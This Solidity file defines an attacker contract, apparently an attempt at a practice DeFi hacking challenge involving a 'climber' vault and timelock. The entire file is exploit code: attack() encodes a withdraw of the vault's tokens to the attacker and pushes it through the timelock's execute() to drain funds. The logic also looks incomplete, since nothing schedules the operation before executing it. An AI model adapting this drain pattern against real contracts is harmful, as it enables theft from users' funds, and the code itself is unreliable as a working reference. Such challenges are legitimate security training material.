// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../climber/ClimberVault.sol";
import "hardhat/console.sol";

contract ClimberAttacker{
    using Address for address;

    ClimberTimelock private immutable climberTimelock;
    ClimberVault private immutable climberVault;
    IERC20 private immutable token;

    constructor(address payable _climberTimelock, address _climberVault, address _token){
        climberTimelock = ClimberTimelock(_climberTimelock);
        climberVault = ClimberVault(_climberVault);
        token = IERC20(_token);
    }

    function attack() external{
        console.log(address(this).balance);
        address[] memory targets = new address[](1);
        targets[0] = address(climberVault);
        uint256[] memory values = new uint256[](1);
        values[0] = 0;
        bytes[] memory dataElements = new bytes[](1);
        uint256 value = 1 ether;
        dataElements[0] = abi.encodeWithSignature("withdraw(address,address,uint256)", address(token), address(this), value);
        climberTimelock.execute{value: 0}(targets, values, dataElements, "0");
        console.log(address(this).balance);
    }
}
